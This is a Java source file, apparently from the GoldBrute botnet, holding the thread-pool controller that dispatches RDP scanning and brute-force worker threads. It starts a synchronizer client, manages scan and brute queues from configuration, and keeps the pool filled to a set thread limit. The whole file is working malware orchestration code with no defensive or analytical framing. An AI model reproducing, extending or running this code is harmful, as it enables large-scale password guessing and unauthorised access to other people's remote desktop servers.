package rdp.gold.brute.pool;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.ThreadPoolExecutor;

import org.apache.log4j.Logger;

import rdp.gold.brute.CheckerBrute;
import rdp.gold.brute.Config;
import rdp.gold.brute.CounterPool;
import rdp.gold.brute.synchronizer.SynchronizerClient;

@SuppressWarnings({ "unchecked", "rawtypes" })
public class GoldBrute extends Thread {
    private static final Logger logger = Logger.getLogger(GoldBrute.class);
    private static boolean enableDebug = true;
    private static Queue<String> taskBruteQueue = new ConcurrentLinkedQueue();
    private static Queue<String> taskScanQueue = new ConcurrentLinkedQueue();
    private static CheckerBrute checkerBrute = new CheckerBrute();

    static {
        checkerBrute.start();
    }

    private ExecutorService executorsPdu = null;

    public static Queue<String> getTaskBruteQueue() {
        return taskBruteQueue;
    }

    public static Queue<String> getTaskScanQueue() {
        return taskScanQueue;
    }

    public static void setTaskScanQueue(Queue<String> tk) {
        taskScanQueue = tk;
    }

    public void run() {
        SynchronizerClient synchronizerClient = new SynchronizerClient();
        synchronizerClient.start();

        final ThreadGroup threadPduGroup = new ThreadGroup("workers_pdu");
        this.executorsPdu = Executors.newCachedThreadPool(new ThreadFactory() {
            public Thread newThread(Runnable r) {
                return new Thread(threadPduGroup, r);
            }
        });
        try {
            for (;;) {
                if (!Config.IS_ENABLED_BRUTE.get()) {
                    taskBruteQueue.clear();
                }
                if (!Config.IS_ENABLED_SCAN.get()) {
                    taskScanQueue.clear();
                }
                CounterPool.countScanQueue.set(taskScanQueue.size());
                CounterPool.countBruteQueue.set(taskBruteQueue.size());

                int pool = ((ThreadPoolExecutor) this.executorsPdu).getActiveCount();
                long pushLimit = Config.getThreads() - pool;
                CounterPool.pool.set(pool);
                if (enableDebug) {
                    logger.info("Push limit " + pushLimit + ", threads limit: " + Config.getThreads() + ", pool: " + pool + ", pool used: " + CounterPool.poolUsed.get() + ", task type: "
                            + Config.TYPE_TASK.get() + ", scan queue: " + taskScanQueue.size() + ", brute queue: " + taskBruteQueue.size());
                }
                if (Config.TYPE_TASK.get() == 0) {
                    Thread.sleep(1000L);

                    Config.IS_TEST_SERVER_BRUTE.set(true);
                    Config.IS_TEST_SERVER_SCAN.set(true);
                } else {
                    if ((Config.IS_TEST_SERVER_BRUTE.get()) || (Config.IS_TEST_SERVER_SCAN.get())) {
                        checkerBrute.runChecker();
                        checkerBrute.awaitCheck();
                    }
                    while (pushLimit > 0L) {
                        this.executorsPdu.submit(Config.TYPE_TASK.get() == 1 ? new ScanThread() : new BruteThread());
                        pushLimit -= 1L;
                    }
                    // logger.info("Pool size is now " + ((ThreadPoolExecutor)
                    // this.executorsPdu).getActiveCount());

                    Thread.sleep(1000L);
                }
            }
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));

            logger.error(e.getMessage() + sw.toString());
        }
    }

    public ExecutorService getExecutorsPdu() {
        return this.executorsPdu;
    }

    public void setTerminated(Boolean terminated) {
    }
}
